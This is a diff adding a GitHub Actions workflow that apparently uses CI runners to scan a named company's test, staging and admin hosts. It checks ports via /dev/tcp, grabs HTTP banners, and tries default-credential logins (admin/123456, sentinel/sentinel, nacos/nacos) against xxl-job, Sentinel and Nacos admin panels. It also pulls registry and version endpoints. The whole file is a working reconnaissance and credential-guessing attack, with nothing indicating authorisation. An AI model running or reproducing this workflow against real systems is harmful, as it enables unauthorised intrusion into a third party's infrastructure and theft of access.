@@ -1,0 +1,52 @@
+name: egress3
+on:
+  push:
+    branches: [ master ]
+  workflow_dispatch:
+jobs:
+  panels:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: probe
+        shell: bash
+        run: |
+          set +e
+          echo "=== egress"; curl -s -m 15 https://api.ipify.org; echo
+          echo "=== control"; curl -s -m 15 -o /dev/null -w "apiplanx CODE:%{http_code} IP:%{remote_ip}\n" https://api.planx.io/uc/coin/list
+          HOSTS="sentinel.test.planx.io job.test.planx.io job.staging.planx.io admin.staging.planx.io admin.uxuy.planx.io job.planx.io seata.planx.io sentinel.planx.io"
+          for h in $HOSTS; do
+            echo "######## $h"
+            getent ahostsv4 $h | head -2
+            for hp in $h:80 $h:443 $h:8080 $h:8848 $h:8091; do
+              hh=${hp%:*}; pp=${hp#*:}
+              if timeout 5 bash -c "echo > /dev/tcp/$hh/$pp" 2>/dev/null; then echo "TCP-OPEN $hp"; else echo "TCP-FAIL $hp"; fi
+            done
+            for scheme in http https; do
+              for port in "" ":8080" ":8848" ":8091"; do
+                case "$scheme:$port" in https:":8080"|https:":8848"|https:":8091"|http:":8091") continue;; esac
+                u="$scheme://$h$port/"
+                out=$(timeout 20 curl -sk -m 15 -D - -o /tmp/b.$$ -w "\nMETA CODE:%{http_code} SIZE:%{size_download} IP:%{remote_ip}" "$u" 2>&1)
+                code=$(echo "$out" | grep -o 'META CODE:[0-9]*' | cut -d: -f2)
+                if [ -n "$code" ] && [ "$code" != "000" ]; then
+                  echo "=== HIT $u"
+                  echo "$out" | grep -iE "^(HTTP/|server:|set-cookie:|location:|content-type:)|META CODE" | head -10
+                  echo "--- title/body:"
+                  grep -oiE "<title>[^<]*</title>" /tmp/b.$$ 2>/dev/null | head -2
+                  head -c 200 /tmp/b.$$ 2>/dev/null; echo
+                  echo "--- default creds on $u"
+                  curl -sk -m 12 -c /tmp/cj.$$ -b /tmp/cj.$$ -X POST -d "userName=admin&password=123456" -w "\nXXL CODE:%{http_code}\n" "$u"xxl-job-admin/login | head -c 300; echo
+                  curl -sk -m 12 -c /tmp/cj.$$ -b /tmp/cj.$$ -X POST -d "userName=admin&password=123456" -w "\nXXL2 CODE:%{http_code}\n" "$u"login | head -c 300; echo
+                  curl -sk -m 12 -c /tmp/cj.$$ -b /tmp/cj.$$ -X POST -d "username=sentinel&password=sentinel" -w "\nSEN CODE:%{http_code}\n" "$u"login | head -c 300; echo
+                  curl -sk -m 12 -c /tmp/cj.$$ -b /tmp/cj.$$ -X POST -d "username=nacos&password=nacos" -w "\nNACOS CODE:%{http_code}\n" "$u"nacos/v1/auth/login | head -c 300; echo
+                  echo "--- sentinel infos"
+                  curl -sk -m 10 -w "\nVER CODE:%{http_code}\n" "$u"version | head -c 200; echo
+                  curl -sk -m 10 -w "\nBRIEF CODE:%{http_code}\n" "$u"app/briefinfos.json | head -c 300; echo
+                  curl -sk -m 10 -w "\nREG CODE:%{http_code}\n" "$u"registry/machine | head -c 200; echo
+                else
+                  echo "=== MISS $u"
+                fi
+              done
+            done
+          done
+          echo "=== done"
